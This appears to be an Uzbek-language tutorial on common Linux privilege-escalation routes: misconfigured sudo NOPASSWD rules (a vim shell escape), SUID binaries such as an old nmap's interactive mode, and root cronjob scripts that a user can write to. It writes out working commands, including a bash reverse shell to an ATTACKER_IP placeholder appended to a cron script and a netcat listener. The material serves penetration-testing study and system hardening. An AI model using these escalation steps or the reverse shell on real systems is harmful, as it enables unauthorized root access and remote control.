**Linux tizimida eng ko‘p uchraydigan (real) privilege escalation misoli**
**1. Sudo misconfiguration (NOPASSWD yoki ALL yoritilgan huquqlar)**
Misol:
sudo -l
Va natijada shunga o‘xshash narsa chiqsa:
(ALL) NOPASSWD: /usr/bin/vim
Bu nimani anglatadi?

**Bu foydalanuvchi vim ni root huquqida hech qanday parolsiz ishga tushirishi mumkin!**
Juda ko‘p Linux serverlarda sysadminlar noto‘g‘ri sudoers sozlashadi, shuning uchun bu "common" huquq eskalatsiyasi hisoblanadi.

**Eskalatsiya:**
sudo vim -c '!sh'
Bu sizga root shell beradi! 💥

**2. SUID bit o‘rnatilgan binar fayllar**
Misol:

find / -perm -4000 -type f 2>/dev/null
Agar natijada shunga o‘xshash binar topilsa:
/usr/bin/nmap
nmap SUID bilan topilsa, va versiyasi eski bo‘lsa, interactive mode orqali root shell olasiz.

**Eskalatsiya:**
nmap --interactive
!sh

**3. Cronjob va Scriptlar**
Agar root foydalanuvchisi tomonidan cronjob orqali noto‘g‘ri yozilgan va foydalanuvchi yozish huquqiga ega bo‘lgan skriptlar ishlayotgan bo‘lsa.

Misol:
ls -la /etc/cron.d/
cat /etc/crontab
Agar cron da root foydalanuvchining ishga tushirayotgan skriptida siz yozish huquqiga ega bo‘lsangiz:
-rw-rw-r-- 1 user user  /opt/backup.sh

**Eskalatsiya:**
backup.sh ichiga siz root shell yoki bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 qo‘shib, keyingi cron ishga tushganda root bo‘lib ketasiz.

-rw-rw-r-- 1 user user /opt/backup.sh
**📌 Bu degani /opt/backup.sh fayliga siz write huquqiga egasiz va root har 5 daqiqada uni ishga tushiradi!**
echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
chmod +x /opt/backup.sh
nc -lvnp 4444

**📌 Eng ko‘p uchraydiganlar:**

**Sudo noto‘g‘ri konfiguratsiyasi (NOPASSWD)**

**SUID bit noto‘g‘ri qo‘yilgan binar**

**Root huquqidagi cronjob lar va foydalanuvchi yozishi mumkin bo‘lgan fayllar**

**Yadro zaifliklari**

**🎯 Tavsiyalar:**

Har doim sudo -l, find / -perm -4000, crontab, va uname -r tekshiring.

pspy64 ni ishga tushirib, background da cron yoki root skriptlarni tahlil qiling.

linPEAS yoki lse.sh avtomatik bularni tezda ko‘rib beradi.
